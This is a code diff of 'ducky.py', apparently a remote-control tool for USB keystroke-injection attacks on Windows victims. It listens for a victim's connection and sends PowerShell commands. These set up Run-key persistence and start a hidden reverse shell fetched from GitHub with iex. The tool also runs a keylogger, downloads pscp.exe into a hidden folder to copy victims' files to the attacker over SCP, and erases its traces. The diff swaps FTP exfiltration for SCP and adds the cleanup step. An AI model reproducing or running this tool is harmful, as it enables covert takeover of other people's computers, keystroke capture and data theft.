@@ -1,21 +1,18 @@
 #!/usr/bin/python3
 # ducky.py
 # Ashish D'Souza
-# October 8th, 2018
+# January 6th, 2019
 import socket
 import threading
 import os
 import sys
+from getpass import getpass
 from time import sleep
-from pyftpdlib import servers
-from pyftpdlib.handlers import FTPHandler
-from pyftpdlib.authorizers import DummyAuthorizer
 
 port = 8008 if len(sys.argv) == 1 else int(sys.argv[1])
 timeout = False
 
 stop = False
-stop_ftp = False
 
 
 def recv(conn):
@@ -24,40 +21,28 @@ def recv(conn):
     print()
 
 
-def ftp_server():
-    if os.getcwd().split("/")[-1] != "ftp":
-        os.chdir(os.getcwd() + "/ftp")
-    authorizer = DummyAuthorizer()
-    authorizer.add_anonymous(".", perm="elradfmw")
-    handler = FTPHandler
-    handler.authorizer = authorizer
-    address = ("0.0.0.0", 21)
-    server = servers.FTPServer(address, handler)
-    server.set_reuse_addr()
-    threading.Thread(target=close_ftp_server, args=(server,)).start()
-    server.serve_forever()
-
-
-def close_ftp_server(server):
-    while not stop_ftp:
-        continue
-    server.close()
-
-
-if sys.platform[:5] == "linux" or sys.platform == "darwin":
-    attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
-elif sys.platform == "win32":
-    attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
+if "-ip" in sys.argv:
+    attacker_ip = sys.argv[sys.argv.index("-ip") + 1]
 else:
-    print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
-    attacker_ip = input("Manual entry is required >> ")
+    if sys.platform[:5] == "linux" or sys.platform == "darwin":
+        attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
+    elif sys.platform == "win32":
+        attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
+    else:
+        print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
+        attacker_ip = input("Manual entry is required >> ")
+if "-ssh" in sys.argv:
+    ssh_address = sys.argv[sys.argv.index("-ssh") + 1]
+else:
+    ssh_address = input("SSH Server Address >> ")
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 if timeout:
     s.settimeout(31)
 s.bind(("", port))
 s.listen(5)
-print("[-] Connecting to victim...")
+print("[-] Waiting for connection...")
 conn, addr = s.accept()
 if timeout:
     s.settimeout(None)
@@ -90,6 +75,8 @@ conn.send("$env:OS\n".encode())
 operating_system = conn.recv(1024).decode()
 print("Operating System:      " + operating_system, end="")
 operating_system = operating_system.split("\n")[0]
+conn.send("cd $env:userprofile/Documents; rm -r z; mkdir z; attrib +h z; cd z; df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"; cd $env:userprofile".encode())
+conn.recv(1024)
 threading.Thread(target=recv, args=(conn,)).start()
 last = ""
 while not stop:
@@ -125,21 +112,20 @@ while not stop:
             print("                     -os          Show operating system")
             print("ducky/persistence    N/A          Set up a persistent shell")
             print("                     -d           Delete the persistent shell")
-            print("ducky/reverse_shell  \"ip:port\"    Set up a custom reverse shell")
-            print("ducky/ftp            N/A          Start FTP server on attacker machine")
-            print("                     -q           Close FTP server on attacker machine")
-            print("ducky/upload         \"filename\"   Upload a file to attacker machine using FTP")
+            print("ducky/reverse_shell  [ip:port]    Set up a custom reverse shell")
+            print("ducky/upload         [file]       Upload a file to attacker machine using SCP")
             print("ducky/rickroll       N/A          Prank the victim with a rickroll")
-            print("ducky/keylogger      \"timeout\"    Execute a keylogger, leave blank for indefinite")
+            print("ducky/keylogger      [timeout]    Execute a keylogger, leave blank for indefinite")
             print("ducky/capslock       N/A          Prank the victim with a toggling caps lock")
             print("ducky/escape         N/A          Prank the victim with a toggling escape key")
             print("ducky/cdrom          N/A          Eject the cdrom drive")
-            print("ducky/iter           \"#\" {\"code\"} Run the powershell code a specified # of times")
-            print("ducky/killall        \"process\"    Kill all processes with this name")
+            print("ducky/iter           [#] {code}   Run the powershell code a specified # of times")
+            print("ducky/killall        [process]    Kill all processes with this name")
             print("ducky/cdromloop      N/A          Prank the victim with a continuously ejecting cdrom drive")
             print("ducky/quackimage     N/A          Prank the victim by opening a \"you just got quacked\" image")
             print("ducky/lock           N/A          Lock the victim's computer")
             print("ducky/simpsons       N/A          Prank the victim with Bart Simpson's lock message")
+            print("ducky/cleanup        N/A          Cleanup footprint, leave no traces")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -184,10 +170,10 @@ while not stop:
             commands = []
             if "-d" in options:
                 commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
-                commands.append("rm $env:userprofile/Documents/persistence.bat")
+                commands.append("rm $env:userprofile/Documents/z/persistence.bat")
             else:
-                commands.append("df \"https://raw.githubusercontent.com/computer-geek64/ducky/master/persistence.bat\" \"$env:userprofile\\Documents\\persistence.bat\"")
-                commands.append("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /d \"$env:userprofile\\Documents\\persistence.bat\" /t REG_SZ")
+                commands.append("df \"https://raw.githubusercontent.com/computer-geek64/ducky/master/persistence.bat\" \"$env:userprofile\\Documents\\z\\persistence.bat\"")
+                commands.append("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /d \"$env:userprofile\\Documents\\z\\persistence.bat\" /t REG_SZ")
             stdin = "; ".join(commands)
         elif ducky_command[:13] == "reverse_shell":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -198,24 +184,10 @@ while not stop:
             commands = []
             commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell.ps1).content\'")
             stdin = "; ".join(commands)
-        elif ducky_command[:3] == "ftp":
-            options = [x for x in ducky_command.split(" ")[1:] if x]
-            if "-q" in options:
-                stop_ftp = True
-                sleep(1)
-                stop_ftp = False
-                stdin = ""
-            else:
-                threading.Thread(target=ftp_server).start()
-                stdin = ""
         elif ducky_command[:6] == "upload":
-            options = [x for x in ducky_command.split(" ")[1:] if x]
-            filename = ducky_command.split("\"")[1]
+            filename = ducky_command[7:]
             commands = []
-            commands.append("out-file -inputobject \'put \"" + filename + "\"\' -encoding ascii ftp.txt")
-            commands.append("out-file -inputobject \'quit\' -encoding ascii -append ftp.txt")
-            commands.append("ftp -A -s:ftp.txt " + attacker_ip)
-            commands.append("rm ftp.txt")
+            commands.append("echo y | & $env:userprofile/Documents/z/pscp.exe -P " + ssh_address.split(":")[1] + " -pw '" + getpass("Password >> ") + "' -scp " + filename + " " + os.popen("whoami").read().strip() + "@" + ssh_address.split(":")[0] + ":" + os.getcwd() + "/scp")
             stdin = "; ".join(commands)
         elif ducky_command[:8] == "rickroll":
             commands = []
@@ -272,6 +244,12 @@ while not stop:
         elif ducky_command[:8] == "simpsons":
             commands = []
             commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/simpsons).content\'")
+            stdin = "; ".join(commands)
+        elif ducky_command[:7] == "cleanup":
+            commands = []
+            commands.append("attrib -h $env:userprofile/Documents/z")
+            commands.append("rm -r $env:userprofile/Documents/z")
+            commands.append("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Persistence\" /f")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
